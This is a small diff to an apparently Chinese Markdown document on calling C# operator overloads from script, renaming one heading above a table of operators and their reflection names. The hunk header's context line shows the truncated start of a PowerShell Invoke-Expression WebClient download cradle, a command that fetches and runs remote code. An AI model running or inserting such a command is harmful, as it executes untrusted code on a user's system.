@@ -66,7 +66,7 @@ powershell.exe -Command "Invoke-Expression ((New-Object System.Net.WebClient).Do
 
 </font>
 
-### <font color=yellow size=5>反射调用c#运算符重载函数</font>
+### <font color=yellow size=5>脚本调用c#运算符重载</font>
 ---
 运算符号 | 反射名称                       | 脚本是否支持直接调用
 -----   |  ----                         | ----
